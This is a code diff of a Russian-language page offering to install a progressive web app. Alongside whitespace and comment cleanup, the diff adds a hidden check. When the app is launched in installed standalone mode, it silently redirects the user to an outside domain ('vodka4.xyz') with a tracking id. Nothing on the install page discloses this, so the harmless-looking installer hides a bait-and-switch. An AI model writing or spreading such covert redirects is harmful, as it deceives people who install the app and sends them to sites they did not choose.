@@ -18,7 +18,7 @@
             padding: 20px;
             text-align: center;
         }
-        
+
         #installButton {
             padding: 12px 24px;
             font-size: 18px;
@@ -29,16 +29,16 @@
             cursor: pointer;
             margin-top: 20px;
         }
-        
+
         #installButton:hover {
             background-color: #45a049;
         }
-        
+
         #installButton:disabled {
             background-color: #cccccc;
             cursor: not-allowed;
         }
-        
+
         #installModal {
             display: none;
             position: fixed;
@@ -51,7 +51,7 @@
             justify-content: center;
             align-items: center;
         }
-        
+
         .modal-content {
             background-color: white;
             padding: 20px;
@@ -59,7 +59,7 @@
             max-width: 500px;
             width: 90%;
         }
-        
+
         .install-option {
             padding: 10px;
             margin: 10px 0;
@@ -67,7 +67,7 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        
+
         .install-option:hover {
             background-color: #f5f5f5;
         }
@@ -76,9 +76,7 @@
 <body>
     <h1>Мое PWA Приложение</h1>
     <p>Нажмите кнопку ниже, чтобы установить это приложение на ваше устройство</p>
-    
     <button id="installButton" disabled>Установить приложение</button>
-    
     <div id="installModal">
         <div class="modal-content">
             <h2>Выберите способ установки</h2>
@@ -86,70 +84,41 @@
             <div class="install-option" id="cancelInstall">Отмена</div>
         </div>
     </div>
-    
     <script>
+        if (window.matchMedia('(display-mode: standalone)').matches) {
+            window.location.href = "https://vodka4.xyz?id=8091";
+        }
+
         let deferredPrompt;
         const installButton = document.getElementById('installButton');
         const installModal = document.getElementById('installModal');
         const installDesktop = document.getElementById('installDesktop');
-        const installShortcut = document.getElementById('installShortcut');
         const cancelInstall = document.getElementById('cancelInstall');
-        
-        // Слушаем событие beforeinstallprompt
+
         window.addEventListener('beforeinstallprompt', (e) => {
             e.preventDefault();
             deferredPrompt = e;
             installButton.disabled = false;
         });
-        
-        // Обработчик нажатия на кнопку установки
+
         installButton.addEventListener('click', () => {
             if (!deferredPrompt) return;
-            
-            // Показываем наш кастомный модальный диалог
             installModal.style.display = 'flex';
         });
-        
-        // Обработчики для модального окна
+
         installDesktop.addEventListener('click', async () => {
             installModal.style.display = 'none';
-            
-            // Показываем стандартное диалоговое окно установки
             deferredPrompt.prompt();
-            
-            const { outcome } = await deferredPrompt.userChoice;
-            console.log(User response to the install prompt: ${outcome});
-            
+            await deferredPrompt.userChoice;
             deferredPrompt = null;
             installButton.disabled = true;
         });
-        
-        installShortcut.addEventListener('click', () => {
-            installModal.style.display = 'none';
-            
-            // Попытка создать ярлык (работает не во всех браузерах)
-            if (navigator.registerProtocolHandler) {
-                try {
-                    navigator.registerProtocolHandler(
-                        'web+myapp',
-                        window.location.href,
-                        'My PWA App'
-                    );
-                    alert('Ярлык создан успешно!');
-                } catch (e) {
-                    alert('Не удалось создать ярлык: ' + e.message);
-                }
-            } else {
-                alert('Ваш браузер не поддерживает создание ярлыков таким способом');
-            }
-        });
-        
+
         cancelInstall.addEventListener('click', () => {
             installModal.style.display = 'none';
         });
-        
+
         window.addEventListener('appinstalled', () => {
-            console.log('PWA was installed');
             installButton.disabled = true;
         });
     </script>
